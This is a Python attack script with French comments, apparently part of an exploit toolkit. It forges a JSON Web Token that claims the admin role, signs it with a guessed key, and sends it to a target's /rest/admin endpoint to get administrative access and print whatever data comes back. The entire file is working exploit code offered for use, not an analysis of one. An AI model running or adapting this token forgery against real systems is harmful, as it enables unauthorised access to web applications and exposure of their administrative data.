import json
import base64
import hmac
import hashlib
import requests

class AdminSectionAccess:
    def __init__(self, target_url: str):
        self.target_url = target_url

    def run_exploit(self):
        print(f"[+] Running Admin Section Access on {self.target_url}")

        # Étape 1 : Forge un JWT admin
        forged_token = self._forge_jwt("admin")
        headers = {"Authorization": f"Bearer {forged_token}"}
        endpoint = f"{self.target_url}/rest/admin"

        # Étape 2 : Envoie une requête pour accéder à la section admin
        try:
            response = requests.get(endpoint, headers=headers)
            print(f"[+] HTTP Status Code: {response.status_code}")
            if response.status_code == 200:
                print("[+] Access granted to Admin Section!")
                print("[+] Response Data:")
                print(response.json())  # Affiche les données JSON retournées par le serveur
            else:
                print(f"[-] Failed to access admin section: {response.status_code}")
                print("[!] Response Content:")
                print(response.text)  # Affiche le contenu brut de la réponse
        except Exception as e:
            print(f"[!] Error during Admin Section Access: {e}")

    def _forge_jwt(self, role: str) -> str:
        # Header du JWT
        header = {"alg": "HS256", "typ": "JWT"}
        # Payload falsifié
        payload = {"role": role, "username": "admin"}
        # Encodage du header et du payload
        header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().strip("=")
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().strip("=")
        # Signature avec une clé falsifiée
        secret_key = "fake-secret"
        signature = hmac.new(secret_key.encode(), f"{header_b64}.{payload_b64}".encode(), hashlib.sha256).digest()
        signature_b64 = base64.urlsafe_b64encode(signature).decode().strip("=")
        return f"{header_b64}.{payload_b64}.{signature_b64}"
